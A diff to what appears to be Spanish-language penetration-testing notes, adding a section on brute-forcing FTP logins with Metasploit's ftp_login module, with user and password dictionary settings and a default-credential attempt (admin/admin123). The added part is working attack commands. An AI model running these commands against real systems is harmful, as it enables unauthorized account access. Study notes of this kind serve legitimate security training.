@@ -70,6 +70,28 @@ set RHOST <IP>
 set RPORT 21
 run
 ```
+### 8. Fuerza bruta de credenciales con Metasploit
+Puedes realizar un ataque de fuerza bruta usando un diccionario de usuarios y contraseñas.
 
+```
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS <IP>
+set USER_FILE /ruta/al/diccionario/usuarios.txt
+set PASS_FILE /ruta/al/diccionario/contraseñas.txt
+set STOP_ON_SUCCESS true
+run
+```
+
+Parámetros útiles:
+- `USER_FILE`: lista de posibles usuarios
+- `PASS_FILE`: lista de posibles contraseñas
+- `STOP_ON_SUCCESS`: detiene el ataque si se encuentra una combinación válida
+
+También puedes probar con combinaciones conocidas directamente:
+```
+set USERNAME admin
+set PASSWORD admin123
+run
+```
 ---
 
